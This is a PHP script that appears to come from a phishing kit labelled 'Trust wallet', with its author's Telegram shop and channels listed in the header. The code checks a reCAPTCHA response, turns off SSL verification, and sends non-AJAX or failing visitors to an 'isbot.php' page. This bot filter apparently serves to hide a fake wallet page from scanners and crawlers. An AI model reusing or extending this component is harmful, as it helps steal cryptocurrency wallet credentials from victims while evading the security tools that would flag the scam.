<?php
/**

 * Group Chat   :   https://t.me/bore3da_chat 
 * @telegram   :   @Bore3da 
 * Project Name:   Trust wallet
 * Author      :   Bore3da
 * channel Telegram  :  https://t.me/bore3dashop
 */
include 'configg.php';
if (!isset($_SERVER['HTTP_X_REQUESTED_WITH'])) {
    header('location:isbot.php');    
}


function validate_recaptcha($response,$YOUR_SECRET_KEY){
	$verifyURL = 'https://www.google.com/recaptcha/api/siteverify';
	$post_data = http_build_query(
		array(
			'secret' => $YOUR_SECRET_KEY,
			'response' => $response,
			'remoteip' => (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR'])
		)
	);
	if(function_exists('curl_init') && function_exists('curl_setopt') && function_exists('curl_exec')) {
		$ch =  curl_init($verifyURL);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
			curl_setopt($ch, CURLOPT_TIMEOUT, 5);
			curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: application/json', 'Content-type: application/x-www-form-urlencoded'));
			$response = curl_exec($ch);
		curl_close($ch);
	} else {
		$opts = array('http' =>
			array(
				'method'  => 'POST',
				'header'  => 'Content-type: application/x-www-form-urlencoded',
				'content' => $post_data
			)
		);
		$context  = stream_context_create($opts);
		$response = file_get_contents($verifyURL, false, $context);
	}
	if($response) {
		$result = json_decode($response);
		if ($result->success===true) {
			return true;
		} else {
			return $result;
		}
	}
	return false; 
}

if(isset($_POST['response'])){
	header('Content-type: application/json');
	$response=$_POST['response'];
	

	$responseKeys = validate_recaptcha($response,$secret_key);

	header('Content-type: application/json');
	if ($responseKeys) {
		session_start();
		$_SESSION['passed_captcha'] = 'yes';
		echo json_encode(['success' => 'true','redirect' => 'homepage']);
	} else {
		echo json_encode(['success' => 'false','redirect' => 'isbot.php']);
	}
	
}
?>